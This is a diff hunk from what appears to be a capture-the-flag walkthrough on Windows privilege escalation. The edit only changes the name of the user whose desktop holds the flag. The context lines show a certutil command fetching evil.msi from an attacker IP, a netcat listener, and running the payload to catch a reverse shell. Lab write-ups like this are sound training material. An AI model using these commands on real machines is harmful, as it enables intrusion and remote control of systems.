@@ -54,7 +54,7 @@ Target Windows server must be accessible with valid domain credentials.
    certutil -urlcache -f http://<ATTACKER-IP>/evil.msi evil.msi
    ```
    - Start a listener on Kali `nc -nlvp <PORT>`
-   - Execute the payload (evil.msi) `./evil.msi` on the windows machine and catch the shell. Find the flag in the desktop directory of the user john.
+   - Execute the payload (evil.msi) `./evil.msi` on the windows machine and catch the shell. Find the flag in the desktop directory of the user Michael.
 
 #### Why It Works
 Misconfigured permissions grant low-privileged users access to sensitive resources, enabling privilege escalation.
